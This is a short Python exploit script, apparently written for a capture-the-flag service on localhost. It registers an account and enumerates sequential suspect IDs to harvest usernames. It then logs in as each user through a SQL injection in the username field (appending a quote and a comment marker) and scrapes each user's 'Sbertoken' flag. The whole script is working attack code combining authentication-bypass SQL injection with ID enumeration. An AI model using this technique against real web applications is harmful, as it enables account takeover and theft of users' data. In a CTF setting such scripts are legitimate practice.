import requests
import re
from bs4 import BeautifulSoup

url = "http://localhost:1015"
hacker_creds = {'username':'1m4h4ck3rr','password':'Level123'}

# parse service to get the list containing usernames and corresponding suspect IDs
def parse_suspects():
    s = requests.Session()
    req = s.post(url+"/register", hacker_creds)
    req = s.post(url+"/authorize", hacker_creds)
    req = s.get(url+"/sus_browser")
    pattern = r'<input\s+type="hidden"\s+name="ID"\s+value="(\d+)"\s*/>'
    match = re.search(pattern, req.text)
    if match:
        value = match.group(1)
        max_sus_id = int(value)
    else:
        print('Failed to parse page!')
        return
    users = []
    for i in range(1, max_sus_id+1):
        req = s.get(url+"/sus/"+str(i))
        soup = BeautifulSoup(req.text, 'html.parser')
        author_username = soup.find('span', id='AuthorUsername')
        users.append((author_username.text.strip("Информация поступила от "), str(i)))
    return users

# here the fun begins
sussy_list = parse_suspects()
for i in sussy_list:
    username = i[0]
    sus_id = i[1]
    s = requests.Session()
    # sqli
    req = s.post(url+"/authorize", data={"username":username+"'--"})
    req = s.get(url+"/sus/"+sus_id)
    soup = BeautifulSoup(req.text, 'html.parser')
    flag = soup.find('p', id='Sbertoken').text.strip("Sbertoken: ")
    print(flag)